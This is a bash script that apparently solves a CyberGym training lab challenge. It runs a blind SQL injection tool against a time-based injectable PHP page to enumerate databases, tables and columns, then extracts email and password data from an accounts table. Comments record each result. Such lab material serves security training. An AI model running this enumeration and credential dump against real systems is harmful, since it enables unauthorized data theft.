#!/bin/bash

if [ "$1" == '' ]; then
	echo "The IP address or hostname of the host machine of the CyberGym program has not been passed";
	echo "Please pass it as the first and only parameter";
	exit;
fi

# NB: The -m parameter is used to not print the data recovered during execution (which are put for convenience
# in a comment following the call in this script) to prevent the output from being too verbose and / or confusing

# Retrieving the databases
./blind_sqli.py -u "http://${1}/sqli/time_based_blind.php?email=string" --databases -m
# The extracted databases are
# information_schema
# mysql
# performance_schema
# scotchbox <--
# Retrieving tables from scotchbox
./blind_sqli.py -u "http://${1}/sqli/time_based_blind.php?email=string" --database=scotchbox --tables -m
# The extracted tables are
# accounts <--
# datacapture
# messages
# Retrieving the names of the columns fron table accounts
./blind_sqli.py -u "http://${1}/sqli/time_based_blind.php?email=string" --database=scotchbox --table=accounts --columns -m
# The names of the extracted columns are
# id: int
# first_name: varchar
# last_name: varchar
# email: varchar
# password: varchar
# Retrieving login data
./blind_sqli.py -u "http://${1}/sqli/time_based_blind.php?email=string" --database=scotchbox --table=accounts --column-list=email,password
# See Challenge1.md for results